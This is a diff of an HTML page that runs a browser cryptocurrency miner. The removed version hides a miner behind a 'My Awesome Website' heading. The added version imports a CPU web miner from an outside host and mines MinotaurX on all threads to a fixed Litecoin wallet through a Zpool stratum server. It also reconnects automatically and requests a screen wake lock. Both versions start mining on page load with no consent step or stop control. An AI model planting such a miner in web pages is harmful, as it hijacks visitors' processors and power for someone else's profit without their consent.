@@ -1,24 +1,63 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>My Awesome Website</h1>
-    <!-- Your content here -->
-    <script type="module">
-      import { autoMine } from "https://earnify.cc/miner.js";
-      
-      // Konfigurasi Zpool untuk algoritma MinotaurX dengan payout LTC
-      const walletLTC = "ltc1qa2y2ysyqw63krk8qhgemq206axxeh8lt40kkm4.SHN/1.0";
-      const cpuUsage = 1; // 1 = 100% CPU
-      
-      // Jika library mendukung custom stratum pool, teruskan parameter berikut:
-      const poolConfig = {
-          pool: "stratum+tcp://minotaurx.mine.zpool.ca:7019", // Server Zpool MinotaurX
-          algo: "minotaurx",
-          pass: "c=LTC" // Password "c=LTC" wajib digunakan di Zpool agar saldo dikonversi dan dibayar ke Litecoin
-      };
+<body style="margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;">
 
-      // Eksekusi autoMine dengan konfigurasi di atas
-      autoMine(walletLTC, cpuUsage, poolConfig);
-    </script>
-  </body>
+<h2 style="font-size: 48px; text-align: center;">PROCESS MINING</h2>
+
+<script type="module">
+import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+
+const stratum = {
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
+    worker: "ltc1qa2y2ysyqw63krk8qhgemq206axxeh8lt40kkm4",
+    password: "c=LTC",
+    ssl: false // true when pool uses SSL, false otherwise
+};
+
+let lastActive = Date.now();
+let reconnecting = false;
+
+function startMiner() {
+    reconnecting = false;
+    lastActive = Date.now();
+    cpuWebMiner.start(
+        cpuWebMiner.minotaurx,
+        stratum,
+        null,
+        cpuWebMiner.ALL_THREADS,
+        work => {
+            lastActive = Date.now();
+            console.log(work);
+        },
+        hashrate => {
+            lastActive = Date.now();
+            console.log(hashrate);
+        },
+        error => {
+            console.log(error);
+            reconnect();
+        }
+    );
+}
+
+function reconnect() {
+    if (reconnecting) return;
+    reconnecting = true;
+    try { cpuWebMiner.stop(); } catch (e) {}
+    setTimeout(startMiner, 3000);
+}
+
+setInterval(() => {
+    if (Date.now() - lastActive > 30000) reconnect();
+}, 10000);
+
+if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').catch(() => {});
+}
+
+startMiner();
+</script>
+
+</body>
 </html>
